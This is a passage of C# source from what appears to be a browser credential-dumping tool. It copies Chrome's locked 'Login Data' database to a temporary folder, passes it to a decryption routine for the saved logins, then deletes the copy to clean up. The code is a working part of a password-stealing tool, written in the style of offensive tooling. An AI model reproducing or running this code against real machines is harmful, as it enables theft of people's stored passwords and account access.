catch (SQLiteException)
{
    string tempDatabaseFilePath = Path.GetTempPath() + "Login Data";

    Console.ForegroundColor = ConsoleColor.Red;
    Console.WriteLine($"[-] Unable to access database file. Copying it to temporary location at:\n\t{Path.GetTempPath()}");
    Console.ResetColor();

    File.Copy(databaseFilePath, tempDatabaseFilePath, true);

    connection = ChromeDatabaseConnection(tempDatabaseFilePath);
    ChromeDatabaseDecrypt(connection);

    //The process will maintain a handle to the temp database file despite database connection disposal. Garbage collection necessary to release thefile for deletion
    GC.Collect();
    GC.WaitForPendingFinalizers();
    File.Delete(tempDatabaseFilePath);
}
